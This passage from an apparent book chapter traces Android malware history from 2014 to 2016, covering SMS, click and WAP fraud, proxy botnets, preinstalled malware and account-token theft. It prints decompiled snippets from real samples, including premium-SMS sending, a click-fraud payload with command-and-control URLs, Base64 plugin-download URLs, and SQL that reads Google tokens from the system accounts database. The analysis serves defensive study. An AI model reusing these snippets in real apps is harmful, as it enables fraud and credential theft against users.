<p class="noindent">The year 2014 also saw the rise of Android cryptocurrency malware. Back then, users could still mine many cryptocurrencies with the limited hardware specs of mobile phones, especially if they controlled a large number of devices and turned them into a mining botnet. At first, surreptitious mining efforts targeted cryptocurrencies like Bitcoin and Litecoin, but they soon homed in on Monero. By design, mining Monero required less powerful hardware than other cryptocurrencies of the time, making it a great match for mobile phones.</p>&#13;
<p class="indent">The biggest thing Monero mining had going for it was a website called Coinhive, which allowed anyone to mine Monero coins with just one line of JavaScript code. Soon, malware authors everywhere (not just on Android) had embedded these Coinhive mining one-liners in apps, websites, advertisements, and anything else that could execute JavaScript code. Antivirus software and other security products started blocking all connections to the site due to the scale of the abuse. In March 2018, computer security journalist Brian Krebs posted a lengthy exposé dubbed “Who and What Is Coinhive?” that chronicled the dubious history of the site and the people behind it. Coinhive shut down in early 2019, and no other site has since followed in its footsteps. This shutdown effectively ended surreptitious cryptocurrency mining by Android malware.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_41"/>When cryptocurrency prices spiked to new record levels in 2020 and 2021, malware authors switched from mining to phishing. The phishing apps broke into cryptocurrency accounts and wallets and transferred any balances to the malware developer’s accounts. Protecting users across the diverse cryptocurrency ecosystem, with thousands of currencies churned through their hype cycles, proved a real challenge. Just keeping track of the names, logos, and websites of all these cryptocurrencies, as well as their official and unofficial wallet apps, is a full-time job for a whole team.</p>&#13;
<h4 class="h4" id="ch02lev1sec15"><strong><em>Taicliphot</em></strong></h4>&#13;
<p class="noindent">Outside of Google Play, the malware situation remained opaque. We believe that the most frequently sideloaded malware between 2012 and 2014 may have been RuFraud, covered earlier in this chapter. Thousands of known app samples operated similarly, but whether they comprised a single malware family or a cluster of families with the same tactics remains unclear. DroidDream Light, which remained active in 2013, disappeared in 2014.</p>&#13;
<p class="indent">Another major off-market family of 2014 was the Taicliphot SMS fraud applications, which targeted pornography viewers in Vietnam. The apps barely contained any code, jumping straight to the SMS fraud functionality in the <code>onCreate</code> method of the main activity. <a href="ch02.xhtml#ch2lis8">Listing 2-8</a>, taken from <em>ncn.taicliphot</em> (v1, 38a3) shows this functionality.</p>&#13;
<pre>protected void onCreate(Bundle savedInstanceState) {&#13;
  Type(UNKNOWN) v2_0 = 1024;&#13;
  super.onCreate(savedInstanceState);&#13;
  this.requestWindowFeature(1);&#13;
  this.getWindow().setFlags(v2_0, v2_0);&#13;
  this.setContentView(2130903041);&#13;
  this.l = ((LinearLayout)this.findViewById(2131034114));&#13;
  SmsManager v0_0 = SmsManager.getDefault();&#13;
  try {&#13;
    if (!this.readFile(this.file).equals("1")) {&#13;
      this.writeFile(this.file, "1");&#13;
      v0_0.sendTextMessage("6022", 0, "test naenewlife", 0, 0);&#13;
      v0_0.sendTextMessage("6022", 0, "test naenewlife", 0, 0);&#13;
      v0_0.sendTextMessage("6022", 0, "test naenewlife", 0, 0);&#13;
      Log.d("aaaaaaaaaaaaaaaaaaaaa", "Da gui");&#13;
    }&#13;
  } catch (IOException v6_0) {&#13;
    v6_0.printStackTrace();&#13;
    try {&#13;
      this.writeFile(this.file, "1");&#13;
      v0_0.sendTextMessage("8782", 0, "HT androi", 0, 0);&#13;
      v0_0.sendTextMessage("8793", 0, "jm2 androi", 0, 0);&#13;
      Log.d("aaaaaaaaaaaaaaaa", "Da gui");&#13;
    } catch (IOException v7_0) {&#13;
      v7_0.printStackTrace();&#13;
      this.l.setOnTouchListener(new ncn.taicliphot.xemcliphot$1(this, v0_0));&#13;
      return;&#13;
    }&#13;
  }</pre>&#13;
<p class="list" id="ch2lis8"><span epub:type="pagebreak" id="page_42"/><em>Listing 2-8: The app</em> ncn.taicliphot <em>(v1, 38a3) sends premium SMS messages without user consent.</em></p>&#13;
<p class="indent">Because the Android versions available at the time did not yet have dynamic permission dialogs, users consented to all permissions requested by an app at installation time. When the user launched the Taicliphot app, they had already granted the SMS permission. This allowed the app to send texts to premium numbers using the code shown here.</p>&#13;
<h4 class="h4" id="ch02lev1sec16"><strong><em>The First Preinstalled Malware</em></strong></h4>&#13;
<p class="noindent">In 2014, we also saw some early instances of preinstalled malware. The Chinese security company Qihoo 360 discovered a preinstalled malware family called OldBoot, which it documented in a January blog post titled “Oldboot: The First Bootkit on Android.” Shortly thereafter, Kaspersky found UUPay, a malware family collecting sensitive user information without consent and potentially adding charges to the user’s phone bill, on Chinese devices, documenting it in the March blog post “Caution: Malware Pre-Installed!”</p>&#13;
<p class="indent">Lookout Mobile Security found DeathRing, a family of trojans that were capable of SMS and WAP fraud. You can read about it in “DeathRing: Pre-Loaded Malware Hits Smartphones for the Second Time in 2014,” from December of that year.</p>&#13;
<p class="indent">The fourth discovery of the year was CoolReaper, reported by Palo Alto Networks and described in “CoolReaper Revealed: A Backdoor in Coolpad Android Devices” in December. CoolReaper was a powerful backdoor family installed on devices by the Chinese manufacturer Coolpad.</p>&#13;
<h3 class="h3" id="ch02lev3"><strong>The Rise of Large Malware Networks: 2015 and 2016</strong></h3>&#13;
<p class="noindent">Android malware continued to evolve rapidly in 2015 and 2016, making these years the most interesting for Android malware research. As changes to Android’s defenses made SMS fraud less profitable, malware authors branched out into other forms of abuse. This section covers examples ranging from trojans and phishing to DDoS attacks, WAP fraud, and more.</p>&#13;
<h4 class="h4" id="ch02lev1sec17"><strong><em>Turkish Clicker</em></strong></h4>&#13;
<p class="noindent">In 2014, a new malware family appeared on Google Play and soon became infamous: Turkish Clicker. Turkish Clicker apps loaded JavaScript code from command-and-control servers and executed it in a WebView. The Android Security team learned of this family when, that year, the malware used infected devices to execute a DDoS attack against Google Play. We’re not sure if this attack was intentional or a byproduct of an overly aggressive <span epub:type="pagebreak" id="page_43"/>attempt to manipulate Google Play’s app-ranking mechanism. Either way, the Android Security team quickly shut down Turkish Clicker, removing its apps from devices to stop the attack.</p>&#13;
<p class="indent">In 2015, Turkish Clicker came back with a vengeance, growing into the largest malware network ever seen on Google Play at that time. It was the first malware network to scale the creation of Google Play developer accounts, creating thousands over the years. Its malware authors experimented with different money-making schemes and ultimately settled on click fraud and WAP fraud, focusing on Turkish users. The public learned about this network in January 2016, when the American–Israeli security firm Check Point blogged about it in a post titled “Turkish Clicker: Check Point Finds New Malware on Google Play.”</p>&#13;
<p class="indent"><a href="ch02.xhtml#ch2lis9">Listing 2-9</a> shows a prettified payload that the Turkish Clicker app <em>com.gkrj.djjsas</em> (v2, c901) downloaded from its command-and-control server.</p>&#13;
<pre>85.248.227.164&#13;
http://olmazsanolmazgudieruvickleri.org/p30.php&#13;
javascript: function rastgele(e, n) {&#13;
  return Math.floor(Math.random() * (n - e + 1) + e)&#13;
}&#13;
&#13;
function fireEvent(e, n) {&#13;
  var i = e;&#13;
  if (document.createEvent) {&#13;
    var t = document.createEvent("MouseEvents");&#13;
    t.initEvent(n, !0, !1), i.dispatchEvent(t)&#13;
  } else document.createEventObject &amp;&amp; i.fireEvent("on" + n)&#13;
}&#13;
&#13;
&#13;
for (var links = document.getElementsByTagName("a"), &#13;
    elmalar = null, i = 0; i0) {&#13;
  fireEvent(document.links[i], "mouseover"),&#13;
  fireEvent(document.links[i], "mousedown"),&#13;
  fireEvent(document.links[i], "click");&#13;
  break&#13;
};</pre>&#13;
<p class="list" id="ch2lis9"><em>Listing 2-9: A click fraud payload downloaded by</em> com.gkrj.djjsas <em>(v2, c901)</em></p>&#13;
<p class="indent">The IP address in the first line (seemingly ignored by the app) may have belonged to a Tor exit node. The URL in the second line is a secondary command-and-control server from which the malware loads a list of target websites. Later in the listing, the JavaScript code contains click fraud functionality that clicks ads on the target websites. At the time of the analysis in 2016, these targets were all pornography websites.</p>&#13;
<h4 class="h4" id="ch02lev1sec18"><strong><em>Gaiaphish</em></strong></h4>&#13;
<p class="noindent"><span epub:type="pagebreak" id="page_44"/>While the largest malware networks of 2015 focused on WAP fraud, midsized networks proved genuinely innovative. Several networks began taking over social media accounts on apps like Instagram or the Russian social network VK by stealing credentials from users. Another network, Shuabang, created countless new Gmail accounts to manipulate Google products. The Spanish computer security company ElevenPaths first described Shuabang in a November 2014 blog post titled “Shuabang Botnet: BlackHat App Store Optimization (BlackASO) in Google Play.”</p>&#13;
<p class="indent">Yet another network, called Gaiaphish and described in the <em>2017 Android Security Year in Review</em> report, phished Google account credentials. In addition, its apps loaded code dynamically to abuse various Google websites. For example, <em>skt.faker.world</em> (v3, 936c) contained Base64-encoded URLs from which to download additional plug-in files that targeted Google’s advertising properties, the social network Google+, and Google Play itself (<a href="ch02.xhtml#ch2lis10">Listing 2-10</a>).</p>&#13;
<pre>static {&#13;
  String[] v0_1 = new String[3];&#13;
  v0_1[0] = "aHR0cDovL24yZm94LmNvbS9uZi9wbHVnaW5hcGs=";&#13;
  v0_1[1] = "aHR0cDovL3Bva2VyYWlyLmNvbS9uZi9wbHVnaW5hcGs=";&#13;
  v0_1[2] = "aHR0cDovL2l3YXNib3JudG9kaWUudXMvbmYvcGx1Z2luYXBr";&#13;
  com.google.dex.b.k = v0_1;&#13;
  return;&#13;
}</pre>&#13;
<p class="list" id="ch2lis10"><em>Listing 2-10: Base64-encoded strings in</em> skt.faker.world <em>(v3, 936c)</em></p>&#13;
<p class="indent">The encoded strings shown here decode to the following URLs:</p>&#13;
<pre>http://n2fox.com/nf/pluginapk&#13;
http://pokerair.com/nf/pluginapk&#13;
http://iwasborntodie.us/nf/pluginapk</pre>&#13;
<p class="indent">The downloaded plug-in hid its malicious functionality in official-sounding package names, like <em>com.google.android.*</em> or <em>com.google.dex.*</em>. Configuration instructions contained dozens of parameters. <a href="ch02.xhtml#ch2lis11">Listing 2-11</a> shows a few of these.</p>&#13;
<pre>name           = ct&#13;
versionGLib    = 16&#13;
debug          = false&#13;
app            = test&#13;
plusDelay      = 10000000&#13;
bannerShow     = 10000000&#13;
bannerHide     = 10000000&#13;
bannerDelay    = 10000000&#13;
banner         = disable&#13;
interCheat     = disable&#13;
bannerCheat    = disable</pre>&#13;
<p class="list" id="ch2lis11"><span epub:type="pagebreak" id="page_45"/><em>Listing 2-11: Gaiaphish configuration options from</em> skt.faker.world <em>(v3, 936c)</em></p>&#13;
<p class="indent">One fun Gaiaphish feature is that its apps would post fake reviews, presumably for pay, on Google Play to increase the popularity and reputation of other apps. Gaiaphish samples contain many of these fake app reviews as hardcoded strings. <a href="ch02.xhtml#ch2lis12">Listing 2-12</a> shows a small selection.</p>&#13;
<pre>private String reviewContent(Context context, com.google.android.w2x.GReview gReview) {&#13;
  String[] v1_0 = vn.com.nfox.android.cst.Constant.getShared(context).&#13;
     getString("reviewContent", "Love it very cute nice download it best game&#13;
     ever #This is a pretty good game it is fun ;-) # I like this game so much&#13;
     #This an amazing game# Thanks for the good game!!! # Lol this game is fun&#13;
      and cute.# This is such a fun, cute and addictive game! I love it! #&#13;
     like this game overall; its cute and fun to play.#Loved it I got it for&#13;
     free# My cousin sis luvs it n its a great game 2 play...").split("#");</pre>&#13;
<p class="list" id="ch2lis12"><em>Listing 2-12: Fake Google Play user reviews taken from</em> skt.faker.world <em>(v3, 936c)</em></p>&#13;
<p class="indent">Android malware has a long history of manipulating Google Play app rankings. Depending on its level of criminality, malware can post fake reviews from phished Google accounts, automatically generated fake Google accounts, or farms of real devices operated by humans. The more convincing these ratings and comments are, the more successful they are at luring unsuspecting users into downloading an app.</p>&#13;
<h4 class="h4" id="ch02lev1sec19"><strong><em>Judy</em></strong></h4>&#13;
<p class="noindent">Judy, the second-largest malware family of 2016, made money through advertising fraud. The security company Check Point first discovered this family and described it in a blog post titled “The Judy Malware: Possibly the Largest Malware Campaign Found on Google Play” in May 2017. Judy apps aimed to execute click fraud against Google advertising properties.</p>&#13;
<p class="indent">Judy app code can be a bit convoluted. It uses an internal messaging system to locate Google ads and execute fraudulent clicks with JavaScript. The prettified code in <a href="ch02.xhtml#ch2lis13">Listing 2-13</a> shows the fraudulent click activity in <em>air.com.eni.AnimalJudy035</em> (v1250000, a72a).</p>&#13;
<pre>public final void run() {&#13;
  float x = (&#13;
    net.shinhwa21.jsylibrary.MService.f(a.a(this.a)) *&#13;
    net.shinhwa21.jsylibrary.MService.g(a.a(this.a)));&#13;
  float y = ((&#13;
    net.shinhwa21.jsylibrary.MService.h(a.a(this.a)) *&#13;
    net.shinhwa21.jsylibrary.MService.g(a.a(this.a))) +&#13;
    net.shinhwa21.jsylibrary.MService.i(a.a(this.a)));&#13;
  ...&#13;
  MotionEvent motionEvent1 =&#13;
    MotionEvent.obtain(downTime, eventTime, ACTION_DOWN, x, y, 0);&#13;
  MotionEvent motionEvent2 =&#13;
    MotionEvent.obtain(downTime, eventTime, ACTION_UP, x, y, 0);&#13;
&#13;
  a.a(this.a).a.dispatchTouchEvent(motionEvent1);&#13;
  a.a(this.a).a.dispatchTouchEvent(motionEvent2);&#13;
  ...&#13;
}</pre>&#13;
<p class="list" id="ch2lis13"><span epub:type="pagebreak" id="page_46"/><em>Listing 2-13: The app</em> air.com.eni.AnimalJudy035 <em>(v1250000, a72a) clicks a random pixel in a previously located ad.</em></p>&#13;
<p class="indent">The click happens in a thread launched after the <code>LODING5</code> message arrives. To make this click, the code calculates random x- and y-coordinates inside the ad. Then it clicks the ad through two calls of the <code>dispatchTouchEvent</code> API.</p>&#13;
<p class="indent">Ad fraud, be it click fraud or other techniques, dominated Android malware after 2016. This lucrative category remains one of the few direct ways for malware authors to make money now that SMS fraud and cryptocurrency mining are less profitable. Many other malware categories are capable of only indirect monetization. For example, to make money from stolen data, a malware author has to find a buyer for it. Likewise, to make money from ransomware, a malware author has to find a victim willing (and able) to pay the ransom.</p>&#13;
<p class="indent">Advertising fraud has another advantage: it can stay completely hidden from users. That’s important, as users can observe and understand more intrusive forms of malware (say, phishing) and uninstall apps suspected of foul play. Advertising fraud can stay undetected on devices for years, generating income for malware authors over a long period.</p>&#13;
<h4 class="h4" id="ch02lev1sec20"><strong><em>DressCode</em></strong></h4>&#13;
<p class="noindent">DressCode, a large malware network discovered by Check Point and described in an August 2016 blog post titled “DressCode Android Malware Discovered on Google Play,” had another innovative way to make money. It turned infected devices into nodes of a proxy botnet. The malware authors could then route traffic (say, abusive traffic to fraudulently click advertisements) through these devices to hide its origin.</p>&#13;
<p class="indent">DressCode apps implement their malware functionality in just a few classes. The malware authors reused sample code published in 2000 on CodeProject (<a href="https://www.codeproject.com"><em>https://www.codeproject.com</em></a>), then added additional classes for their proxying needs. <a href="ch02.xhtml#ch2lis14">Listing 2-14</a> shows prettified code taken from <em>com.dark.kazy.goddess.lp</em> (v1, d858). After connecting to a preconfigured command-and-control server, the code parses the text-based commands received from the server and opens new proxy connections to other servers specified in the <code>CREATE</code> command.</p>&#13;
<pre>String line[] = lines[i];&#13;
if (!line.equals("HELLO")) {&#13;
  if (!line.startsWith("PING")) {&#13;
    if (!line.startsWith("SLEEP")) {&#13;
      if (!line.startsWith("WAIT")) {&#13;
        if (line.startsWith("CREATE")) {&#13;
          String[] splitLine = line.split(",");&#13;
          if (splitLine.length == 3) {&#13;
            this.createConnection(&#13;
              splitLine[1], Integer.valueOf(splitLine[2]).intValue());&#13;
          }</pre>&#13;
<p class="list" id="ch2lis14"><span epub:type="pagebreak" id="page_47"/><em>Listing 2-14: The app</em> com.dark.kazy.goddess.lp <em>(v1, d858) parses various proxy commands from its command-and-control server.</em></p>&#13;
<p class="indent">Once in control of a proxy botnet, malware authors can make money in several ways. For instance, in addition to the example mentioned above, they can sell botnet access to other gangs who want to execute DDoS attacks, or they can turn infected devices into exit nodes for VPN providers.</p>&#13;
<p class="indent">The VPN option became one of the most widespread forms of Android malware abuse between 2016 and 2021. As user demand rose for personal VPN services in those years, shady VPN companies built their business on the backs of unwitting Android users. These VPN companies created proxy SDKs and paid established Android developers to include them in their popular apps. Users who installed apps with these SDKs had their devices turned into end nodes for proxied network traffic. Of course, this happened without disclosure to users.</p>&#13;
<p class="indent">Like advertising fraud, this is an easy way to monetize Android malware. Proxy behavior is just as invisible to users as click fraud and can continue for as long as apps with proxy SDKs are installed.</p>&#13;
<h4 class="h4" id="ch02lev1sec21"><strong><em>Joker</em></strong></h4>&#13;
<p class="noindent">Joker is probably the largest malware family in Google Play history, exceeding the scale even of Turkish Clicker. Since 2016, its developers have been at work crafting SMS and WAP fraud applications for Google Play.</p>&#13;
<p class="indent">The Android Security team first referenced Joker in its <em>2017 Android Security Year in Review</em> report, calling it BreadSMS. Then, in June 2019, Danish CSIS Security Group rediscovered Joker and described it in a blog post titled “Analysis of Joker—A Spy &amp; Premium Subscription Bot on GooglePlay.” That publication, and a follow-up blog post by the Android Security team called “PHA Family Highlights: Bread (and Friends)” in January 2020, provide technical details about this family.</p>&#13;
<p class="indent">Since 2019, Joker has been repeatedly found on Google Play, and many security researchers have reported it. To this day, the original Joker developers likely continue to develop WAP fraud applications targeting Southeast Asia, but we also believe that copycat malware developers have sprung up in the wake of Joker’s public success. Today, “Joker” is an umbrella term for WAP fraud on Google Play, covering an unknown number of distinct malware families.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_48"/>The most interesting aspects of Joker are its scale and its sophisticated methods of evading detection. Between 2016 and 2022, malware developers created thousands of Joker apps. As the Android Security team and antivirus companies learned how to detect Joker, the developers adjusted their defenses to avoid detection. Over the years, malware developers and defenders went through many iterations of this cat-and-mouse game. As a result, recent Joker apps are more convoluted than most malware families.</p>&#13;
<p class="indent">The Joker app <em>com.guo.smscolor.amessage</em> (v5, 5445) from November 2021 shows how far things have gone. The app contains an encrypted file, <em>assets/ extersion/ex_compose</em>, that is really native ARM code. Once decrypted by the app and executed, this file reveals encrypted DEX code, which gets decrypted and executed. The code downloads a file called <em>adal.jar</em> from AliBaba’s cloud service and executes that, too. This <em>adal.jar</em> file contains the actual WAP fraud code. Of course, a smattering of other defensive techniques are employed throughout each of these steps, like emulator detection, code obfuscation, and encryption.</p>&#13;
<p class="indent"><a href="ch02.xhtml#ch2lis15">Listing 2-15</a> shows code from <em>com.guo.smscolor.amessage</em> (v5, 5445), which targets South Africa and Thailand for WAP fraud. We’ve intentionally left it obfuscated to show how difficult it is to understand contemporary Joker code.</p>&#13;
<pre>if (v0_10 != null) {&#13;
  v0_11 = v0_10.getSimOperator();&#13;
    if (android.text.TextUtils.isEmpty(v0_11)) {&#13;
      v0_11 = "";&#13;
    }&#13;
  }&#13;
&#13;
  vgy7.vgy7.vgy7.vgy7.bhu8.cft6 = v0_11;&#13;
&#13;
if (vgy7.vgy7.vgy7.vgy7.bhu8.cft6.startsWith("655")) {&#13;
  if (vgy7.vgy7.vgy7.vgy7.cft6.bhu8.qaz1 == null) {&#13;
    vgy7.vgy7.vgy7.vgy7.cft6.bhu8.qaz1 =&#13;
      new vgy7.vgy7.vgy7.vgy7.cft6.bhu8(v5_0, 5);&#13;
  }&#13;
  if (vgy7.vgy7.vgy7.vgy7.cft6.bhu8.wsx2 == null) {&#13;
    vgy7.vgy7.vgy7.vgy7.cft6.bhu8.wsx2 =&#13;
      new vgy7.vgy7.vgy7.vgy7.cft6.bhu8(v5_0, 9);&#13;
  }&#13;
  vgy7.vgy7.vgy7.vgy7.cft6.bhu8.qaz1.nji9();&#13;
  vgy7.vgy7.vgy7.vgy7.cft6.bhu8.wsx2.nji9();&#13;
}&#13;
&#13;
  if (("52001".equals(vgy7.vgy7.vgy7.vgy7.bhu8.cft6)) ||&#13;
     (("52003".equals(vgy7.vgy7.vgy7.vgy7.bhu8.cft6)) ||&#13;
      ("52023".equals(vgy7.vgy7.vgy7.vgy7.bhu8.cft6)))) {&#13;
    v0_0 = 1;&#13;
  }&#13;
  if (v0_0 != null) {&#13;
    String v0_8 = v2_8.bhu8;&#13;
    if ((v0_8 != null) &amp;&amp; (v0_8.toLowerCase().startsWith(&#13;
      "http://ss1.mobilelife.co.th/wis/wap"))) {&#13;
      String v0_12 = new String(v2_8.mko0);&#13;
      this.bhu8.vgy7(v2_8.bhu8);&#13;
      this.bhu8.vgy7().cft6 = v0_12;&#13;
      vgy7.vgy7.vgy7.vgy7.mko0.vgy7 v2_12 = this.bhu8;&#13;
      String v3_42 = vgy7.vgy7.vgy7.vgy7.bhu8.vgy7(&#13;
        v0_12, "id=\"msisdn-4g-box\" value=\"", "\"");</pre>&#13;
<p class="list" id="ch2lis15"><span epub:type="pagebreak" id="page_49"/><em>Listing 2-15: Sample code from the app</em> com.guo.smscolor.amessage <em>(v5, 5445)</em></p>&#13;
<p class="indent">This example illustrates how <em>adal.jar</em> targets different countries and carriers. The Android API <code>getSimOperator</code> returns a five- or six-digit string containing the phone’s mobile country code and its mobile network code (MNC). Then the code checks whether this value starts with 655, the MCC for South Africa. In another place, it compares the value to 52001, 52003, and 52023. The prefix 520 identifies Thailand, and the suffixes 01, 03, and 23 identify three of Thailand’s largest mobile networks: AIS, AIS-3G, and MTS. Joker targets these networks for WAP fraud.</p>&#13;
<p class="indent">South Africa and Thailand are among the most common targets of WAP fraud. Other popular targets include countries in Southeast Asia (Vietnam and Indonesia, in particular) and the Middle East (including Egypt, the United Arab Emirates, Saudi Arabia, and others).</p>&#13;
<div class="box5">&#13;
<p class="boxtitle-d"><strong>RAMNIT: WHEN WINDOWS MALWARE INFECTS ANDROID DEVELOPERS</strong></p>&#13;
<p class="noindent">As a curious side note, 2015 and 2016 were big years for the Windows botnet Win32!Ramnit. This botnet infected the Windows computers of so many Android developers that it became the seventh-largest Google Play malware family of 2016. On infected computers, Ramnit injected itself into ZIP files to propagate. Because Android apps are just ZIP files with the APK file extension, Ramnit also infected those. It wasn’t cross-system malware, so the fact that Android users installed apps containing Ramnit posed no danger. Nevertheless, the Android Security team removed apps with Ramnit executables from Google Play and asked infected developers to clean up their development systems.</p>&#13;
</div>&#13;
<h4 class="h4" id="ch02lev1sec22"><strong><em>Triada</em></strong></h4>&#13;
<p class="noindent">When we discussed Ghost Push earlier in this chapter, we described a booming Chinese malware industry of connected creators and distributors. Other early malware specimens from this network include Triada and Chamois in 2014; Gooligan, Snowfox, and YouTube Downloader in 2015; and Hummingbad in 2016. These malware families were huge, with sophisticated distribution models. While early versions of these networks spread through <span epub:type="pagebreak" id="page_50"/>Google Play and sideloading, their distributors later focused on a much better distribution method: infiltrating and undermining the device manufacturing process.</p>&#13;
<p class="indent">Conveniently, most Android devices are manufactured in China, making it easy for Chinese malware authors to access them. One common way to gain this access appears to be through forming shell companies that masquerade as legitimate software developers. In reality, the software they build contains backdoors and other malicious built-in functionality. We have seen these shell companies develop over-the-air update solutions, face unlock software, and font management software with backdoors, then cheaply sell this technology to device manufacturers. As part of the integration process, the shell companies ask the manufacturers to give their software privileged access deep into the Android systems, allowing the malware to execute functionality that previously required rooting exploit capabilities.</p>&#13;
<p class="indent">Triada might be the most famous preinstalled Android malware family. First described by Kaspersky in two blog posts in March 2016, “Triada: Organized Crime on Android” and “Everyone Sees Not What They Want to See,” it reached a level of sophistication rarely seen before. In June 2019, the Android Security team published additional technical insights about Triada’s capabilities in “PHA Family Highlights: Triada.” That month, tech journalist Brian Krebs dug into the origins of Triada and the people behind it in “Tracing the Supply Chain Attack on Android.”</p>&#13;
<p class="indent">To understand how sophisticated malware families develop over time, it helps to look at early samples. These tend to be more primitive and contain fewer anti-analysis techniques, like obfuscation and encryption. Following the development of a malware family over time also helps understand the malware developers’ motivations and what did and didn’t work for them.</p>&#13;
<p class="indent">Triada’s roots go back to at least September 2014, when a sample appeared with the package name <em>com.untory.run1</em> (v1, 251c). This app is easy to understand, as it uses few defensive techniques. The Java packages <em>security.*</em>, <em>tools.*</em>, and <em>util.*</em> contain the core of the Triada code. The only attempt at obfuscation is a few encrypted strings that the app would decrypt at runtime with the help of a native code function in the embedded file <em>libhzwtool.so</em>. Like the use of .NET by the Mono WAP fraud family described earlier in this chapter, the use of code in native libraries can bypass app scanning tools that only analyze Java code. Hoping to evade these limited tools, the Triada authors intentionally used native code as an anti-analysis trick; the string decryption function doesn’t contain any behavior that could not be implemented in Java.</p>&#13;
<p class="indent">As input, the string decryption algorithm accepts a hex string and two 16-byte keys. It then XORs each byte of the ciphertext with the appropriate bytes of the two keys. The two keys are read from offsets 0x08 and 0x18 of the asset file <em>assets/hzwLib</em>. For years, Triada has hidden encryption keys in asset files and used simple double-XOR decryption algorithms, making new samples easy to recognize.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_51"/>For its rooting capabilities, the <em>com.untory.run1</em> (v1, 251c) sample uses EasyRoot. This is an Android SDK developed by Chinese technology conglomerate Baidu that contains rooting exploits for different devices and is freely available for Android developers to embed in their apps. Triada stores the rooting exploits in the package <em>com.baidu.easyroot</em>.</p>&#13;
<p class="indent">We believe that the shift to manufacturer infiltration happened partly because Android devices became more difficult to root. We have never seen one of these Chinese networks deploy zero-day rooting capabilities, suggesting that they had previously relied on rooting exploits developed by others. After 2015, public rooting exploits became so rare that years could go by between releases. Tired of waiting, the malware developers likely had to find an alternative way to get privileged system access.</p>&#13;
<p class="indent">There are other benefits to infiltrating device manufacturers. Pre-installed software can perform device modifications that are off-limits even to rooting exploits, such as changes to security settings like SELinux. It is also much easier to gain a large installation base: malware distributors only have to dupe one company into installing their malware onto hundreds of thousands of devices. That’s a much easier task than advertising a product to individual Android users in the hopes that they will choose to install it! These advantages helped preinstalled malware take off in 2015.</p>&#13;
<h4 class="h4" id="ch02lev1sec23"><strong><em>Chamois</em></strong></h4>&#13;
<p class="noindent">Following in Triada’s footsteps, Chamois may have been the most impactful botnet of 2018. First publicly described by the Android Security team in March 2017 in a blog post titled “Detecting and Eliminating Chamois, a Fraud Botnet on Android,” it originated in November 2014.</p>&#13;
<p class="indent">Chamois improved upon Triada in several ways, most noticeably by introducing complex anti-analysis functionality. It includes several layers of encrypted native code of much higher complexity than Triada’s, then hides at least 45 environmental checks to determine whether it is running in an emulated environment or under analysis by security researchers. While many Android malware samples already had similar checks, 45 of them was exceptional at the time. The Android Security team discusses these features further in the 2018 Virus Bulletin paper “Unpacking the Packed Unpacker: Reversing an Android Anti-Analysis Native Library.”</p>&#13;
<p class="indent">Chamois was also an early example of malware that pivoted from using Google Play as an infection vector to getting preinstalled on user devices. After the Android Security team first removed all Chamois apps from Google Play in 2017, the Chamois developers started contacting Android manufacturers. Officially, they offered a mobile payment solution, but this solution contained hidden code that downloaded and executed malicious functionality, like advertising or SMS fraud.</p>&#13;
<h4 class="h4" id="ch02lev1sec24"><span epub:type="pagebreak" id="page_52"/><strong><em>Gooligan and Snowfox</em></strong></h4>&#13;
<p class="noindent">Two other Android malware families from China, Gooligan and Snowfox, compromised millions of Google accounts in 2015 and 2016. Instead of phishing users for their Google account credentials, these families stole Google account tokens from a protected part of the Android operating system. These account tokens gave the thieves total control over a victim’s account. For example, they could log into the victim’s Gmail account, download their files from Google Drive, or look at the photos they’d saved in Google Photos.</p>&#13;
<p class="indent">Regular apps can’t access the area of the operating system that stores Google account access tokens. To steal the tokens, third-party applications need to elevate their privileges with an exploit or come preinstalled with elevated privileges already granted. Gooligan did both. As described by Check Point in “More Than 1 Million Google Accounts Breached by Gooligan” in November 2016, Gooligan used several exploits to elevate its regular app privileges to root. It collected information about the device configuration, sent that to its command-and-control server, and downloaded exploit plug-ins that specifically targeted the fingerprinted device type.</p>&#13;
<p class="indent">Snowfox, named after its characteristic <em>com.snowfox</em> package name, is an SDK discovered after Gooligan. Unlike Gooligan, it did not download exploit plug-ins to root devices. Rather, it came preinstalled on devices or, if sideloaded, relied on devices already being rooted. Snowfox was extremely capable, with an extensive plug-in system that downloaded additional code from its command-and-control server. We have observed more than 30 different plug-in files with functionality like Google account token theft, advertising fraud, or the ability to download and install more apps. The Android Security team was the first to describe Snowfox, in the <em>2018 Android Security Year in Review</em> report.</p>&#13;
<p class="indent">One example of a Snowfox app is <em>com.zg.magicDrop</em> (v1, 9097). After communicating with its command-and-control servers via encrypted channels, this app downloads plug-ins like <em>snowfox</em>_<em>v19n.jar</em> with malicious functionality. This plug-in code isn’t well obfuscated. For example, <a href="ch02.xhtml#ch2lis16">Listing 2-16</a> shows the functionality used to steal Google account tokens. It first copies the Accounts database to a different location and then uses SQLite commands to extract the tokens from the database.</p>&#13;
<pre>com.snowfox.core.dy.util.DebugTool.info(&#13;
  com.snowfox.core.dy.util.GpAccount.TAG,&#13;
  new StringBuilder().append("ngPref.getIsRootToken()===")&#13;
    .append(v4_0.getIsRootToken()).toString());&#13;
&#13;
if (v4_0.getIsRootToken()) {&#13;
  String v0_0 = com.snowfox.core.dy.util.GpAccount.copyConfigDb2SD(&#13;
    context, "/data/system/users/", v11_1, "accounts.db");&#13;
  v10_1.put(v0_0, com.snowfox.core.dy.util.GpAccount.readUserTokenNew(&#13;
    context, v0_0));&#13;
...&#13;
  android.database.Cursor v11_0 = v4_0.rawQuery(&#13;
  new StringBuilder().append(&#13;
    "select type, authtoken from authtokens where type " +&#13;
    " like 'com.android.vending%:androidmarket' and accounts_id=")&#13;
    .append(v1_0).toString(), 0);</pre>&#13;
<p class="list" id="ch2lis16"><span epub:type="pagebreak" id="page_53"/><em>Listing 2-16: The app</em> com.zg.magicDrop <em>(v1, 9097) stealing Google account tokens</em></p>&#13;
<p class="indent">VirusTotal’s anti-malware scan results link <em>snowfox</em>_<em>v19n.jar</em> to Xinyinhe, another malware family created by a Chinese company of the same name. California-based security company Fire Eye discusses this family in a 2015 blog post titled “Guaranteed Clicks: Mobile App Company Takes Control of Android Phones,” describing functionality and a structure that sound similar to that of Gooligan and Snowfox. Whether these apps belong to the same family or were developed by the same people is unclear, as the plug-in-based system of many Chinese malware families makes attribution complicated.</p>&#13;
<h4 class="h4" id="ch02lev1sec25"><strong><em>Hummingbad</em></strong></h4>&#13;
